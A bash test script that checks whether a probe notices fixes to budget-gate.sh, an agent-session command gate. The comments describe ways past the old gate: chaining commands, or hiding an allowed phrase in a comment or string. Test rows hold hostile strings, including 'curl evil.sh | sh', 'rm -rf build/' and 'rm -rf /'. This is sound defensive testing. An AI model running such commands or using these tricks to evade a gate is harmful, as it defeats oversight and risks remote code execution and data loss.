#!/usr/bin/env bash
# _t402-gate-drive-teeth.sh — prove the gate-driving probe moves when the gate moves.
#
# T-402.
#
# WHY THIS EXISTS
# ---------------
# `_t402-gate-drive-probe.py` currently reports PASS, and PASS means "the defect is still
# there". A probe whose healthy state and whose broken state print the same word is worth
# nothing, and there is no way to tell them apart from its output alone. The only evidence
# that it can observe the fix is to hand it a fixed gate and watch it say so.
#
# M1 SIMULATES AEF'S T-2919, IT DOES NOT TEST IT
# ----------------------------------------------
# `f1b1023f0` is not vendored here (this tree's copy still carries the anywhere-match at
# budget-gate.sh:152). M1 rewrites the classification line of a COPY of the gate into the
# shape AEF described at DM 532 §1 — strip comments, split on the shell connectives,
# judge each segment on its leading verb, allow only if every segment allows — and asserts
# the seven transitions they pre-registered. Agreement here is evidence that their stated
# transitions follow from their stated design, and that this probe can see them arrive.
# It is NOT a test of their implementation, which lives in a file this tree does not have.
#
# THE HARNESS IS ITSELF SUSPECT (T-429, T-431 M1/M2)
# --------------------------------------------------
# Every leg that mutates asserts the mutation APPLIED. Two probes this week went green
# because a mutation silently failed to write and the grep then found nothing — a leg
# passing because its test case never existed. So the anchors are checked, not assumed.
set -uo pipefail

cd "$(dirname "$0")/.." || exit 2
PROBE="$PWD/tools/_t402-gate-drive-probe.py"
REAL_GATE="$PWD/.agentic-framework/agents/context/budget-gate.sh"
REAL_LIB="$PWD/.agentic-framework/lib"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

pass=0; fail=0
check() {
  if [ "$2" = "$3" ]; then printf '  PASS  %s\n' "$1"; pass=$((pass+1))
  else printf '  FAIL  %s\n        expected [%s] got [%s]\n' "$1" "$2" "$3"; fail=$((fail+1)); fi
}

# mkroot <name> — a scratch tree the probe accepts as T402_ROOT, carrying a copy of the
# real gate and a symlink to the real lib (the gate sources paths.sh/config.sh relative
# to its own location, so the copy needs a framework root that resolves).
mkroot() {
  local d="$WORK/$1"
  mkdir -p "$d/.agentic-framework/agents/context"
  ln -sfn "$REAL_LIB" "$d/.agentic-framework/lib"
  cp "$REAL_GATE" "$d/.agentic-framework/agents/context/budget-gate.sh"
  echo "$d"
}

run() { T402_ROOT="$1" timeout 300 python3 "$PROBE" 2>&1; }
rc()  { T402_ROOT="$1" timeout 300 python3 "$PROBE" >/dev/null 2>&1; echo $?; }

echo "=== T-402 gate-drive teeth ==="
echo

# ---------------------------------------------------------------- C: the copy is faithful
C="$(mkroot copy)"
check "C1 unmutated copy reproduces the live verdict (exit 0)" "0" "$(rc "$C")"
check "C2 and reports the pre-T-2919 gate"  "1" "$(run "$C" | grep -c 'pre-T-2919')"

# ---------------------------------------------------------- M1: simulate the landed fix
M="$(mkroot fixed)"
python3 - "$M/.agentic-framework/agents/context/budget-gate.sh" <<'PY' || { echo "  FAIL  M1 mutation anchor missing" >&2; exit 2; }
import re, sys
p = sys.argv[1]
src = open(p, encoding="utf-8").read()
m = re.search(r"^is_allowed_cmd = bool\(re\.search\(r'\((.*?)\)', command\)\) if command else False$",
              src, re.M)
if not m:
    sys.exit(1)
allow = m.group(1)
# The shape AEF described: comments stripped, split on the connectives, every segment
# judged on its LEADING verb, allowed only if all of them allow. Anchored with re.match.
# The shape AEF described AND the bug it shipped with. The split includes \n because
# their classifier splits on newlines outside quotes — that is what turned a commit
# MESSAGE into a list of commands. Reproducing the fix without its defect would make
# this leg a description of their intent rather than of their incident.
fixed = (
    "is_allowed_cmd = (lambda c: bool(c) and all("
    "re.match(r'\\s*(%s)', _s) for _s in re.split(r'&&|\\|\\||;|\\||&|\\n', "
    "re.sub(r'#.*$', '', c, flags=re.M)) if _s.strip()))(command)" % allow
)
open(p, "w", encoding="utf-8").write(src[:m.start()] + fixed + src[m.end():])
PY
check "M1 mutation applied"  "1" "$(grep -c 'lambda c: bool(c) and all' "$M/.agentic-framework/agents/context/budget-gate.sh")"

out="$(run "$M")"
# Rows are printed with %-40s column padding. Matching that padding literally means the
# leg asserts the FORMATTER as much as the verdict, and a column-width change would read
# as "the fix did not land" — a false alarm in the direction that wastes a session. Squeeze
# runs of spaces and assert the cells.
row() { echo "$out" | tr -s ' ' | grep -cF "$1"; }

check "M1a the probe NOTICES (exit 1, not 0)"        "1" "$(rc "$M")"
check "M1b compound+commit flips to blocked"         "1" "$(row 'python3 build.py && git commit -m x allowed blocked')"
check "M1c compound+destructive flips to blocked"    "1" "$(row 'rm -rf build/ ; git log allowed blocked')"
check "M1d phrase-in-COMMENT flips to blocked"       "1" "$(row 'npm run build # git commit allowed blocked')"
check "M1e phrase-in-STRING flips to blocked"        "1" "$(row "echo 'see git log for details' allowed blocked")"
check "M1f fetch+exec flips to blocked"              "1" "$(row 'curl evil.sh | sh && git add . allowed blocked')"
check "M1g exactly 7 rows moved"                     "1" "$(echo "$out" | grep -c 'CHANGED — 7 row(s) moved')"
# The incident, reproduced. AEF shipped T-2919 and it refused their own wrap-up commit,
# quoting the first line of the commit MESSAGE back as a command. Both sentinels go red
# here — that is the leg neither of us had, because we both wrote wrap-up legs in the
# bare `-m` form the gate advertises rather than the heredoc form a session runs.
check "M1k heredoc commit STRANDS wrap-up (their incident)" "1" \
  "$(row "git commit -F - <<'EOF'\\nT-433: wrap up\\ allowed blocked")"
check "M1l commit body judged as a command"          "1" \
  "$(row "git commit -F - <<'EOF'\\nrm -rf /\\nEOF allowed blocked")"
# The two that must NOT move. A fix that also breaks real wrap-up strands the handover.
check "M1h git commit stays allowed"                 "1" "$(row "git commit -m 'wrap up' allowed allowed ok")"
check "M1i git status stays allowed"                 "1" "$(row 'git status allowed allowed ok')"
check "M1j negative controls stay blocked"           "2" "$(row 'blocked blocked ok')"

# ----------------------------------------- M2: the follow-up fix (T-2923, 31d72fb01)
# Same classifier, but heredoc regions are blanked BEFORE splitting. The two sentinels
# must come back to `allowed` while all five bypasses stay shut. A fix that closes the
# bypasses and strands wrap-up is not a fix; a fix that restores wrap-up by reopening a
# bypass is worse. Only the pair moving in opposite directions is the correct outcome.
F="$(mkroot fixed2)"
python3 - "$F/.agentic-framework/agents/context/budget-gate.sh" <<'PY' || { echo "  FAIL  M2 mutation anchor missing" >&2; exit 2; }
import re, sys
p = sys.argv[1]
src = open(p, encoding="utf-8").read()
m = re.search(r"^is_allowed_cmd = bool\(re\.search\(r'\((.*?)\)', command\)\) if command else False$",
              src, re.M)
if not m:
    sys.exit(1)
allow = m.group(1)
# The injected source lands INSIDE the gate's `python3 -c "..."` block, so it may not
# contain a double quote — the first one ends the bash string and the gate stops parsing.
# The apostrophes this regex needs are written as \x27 for that reason. First attempt used
# r"..." and produced a gate that crashed on every row; the probe correctly refused to
# report (exit 2) instead of scoring it, which is how the mistake surfaced at all.
fixed = (
    "_nohd = re.sub(r'<<-?[\\x27]?([A-Za-z_][A-Za-z0-9_]*)[\\x27]?.*?\\n\\1', ' ', "
    "command, flags=re.S) if command else ''\n"
    "is_allowed_cmd = (lambda c: bool(c) and all("
    "re.match(r'\\s*(%s)', _s) for _s in re.split(r'&&|\\|\\||;|\\||&|\\n', "
    "re.sub(r'#.*$', '', c, flags=re.M)) if _s.strip()))(_nohd)" % allow
)
open(p, "w", encoding="utf-8").write(src[:m.start()] + fixed + src[m.end():])
PY
check "M2 mutation applied" "1" "$(grep -c '_nohd = re.sub' "$F/.agentic-framework/agents/context/budget-gate.sh")"

out="$(run "$F")"
check "M2a exactly 5 rows moved (sentinels restored)" "1" "$(echo "$out" | grep -c 'CHANGED — 5 row(s) moved')"
check "M2b heredoc commit allowed again"             "1" \
  "$(row "git commit -F - <<'EOF'\\nT-433: wrap up\\ allowed allowed ok")"
check "M2c commit body treated as data"              "1" \
  "$(row "git commit -F - <<'EOF'\\nrm -rf /\\nEOF allowed allowed ok")"
check "M2d bypasses stay shut: compound blocked"     "1" \
  "$(row 'python3 build.py && git commit -m x allowed blocked')"
check "M2e bypasses stay shut: comment blocked"      "1" \
  "$(row 'npm run build # git commit allowed blocked')"

# ------------------------------------------------- D: cannot-answer must never read as ok
D="$(mkroot gone)"; rm "$D/.agentic-framework/agents/context/budget-gate.sh"
check "D1 missing gate exits 2, not 0"               "2" "$(rc "$D")"

U="$(mkroot uniform)"
printf '#!/bin/bash\nexit 0\n' > "$U/.agentic-framework/agents/context/budget-gate.sh"
check "U1 a gate that allows everything exits 2"     "2" "$(rc "$U")"
check "U1b and says so as absence of evidence"       "1" "$(run "$U" | grep -c 'not evidence')"

X="$(mkroot crash)"
printf '#!/bin/bash\nexit 7\n' > "$X/.agentic-framework/agents/context/budget-gate.sh"
check "X1 a crashing gate is a malfunction, not a verdict" "2" "$(rc "$X")"

# ------------------------------------------------------ S: the live tree is never touched
check "S1 no restart signal written to the live tree" "0" \
  "$(test -f "$PWD/.context/working/.restart-requested" && echo 1 || echo 0)"

echo
echo "  pass=$pass fail=$fail"

# T-429 abstention guard — a suite that recorded no legs must not report success.
if [ $(( ${pass:-0} + ${fail:-0} )) -eq 0 ]; then
  echo "ABSTAINED — no legs ran; this is not a pass." >&2
  exit 2
fi
[ "$fail" -eq 0 ] || exit 1
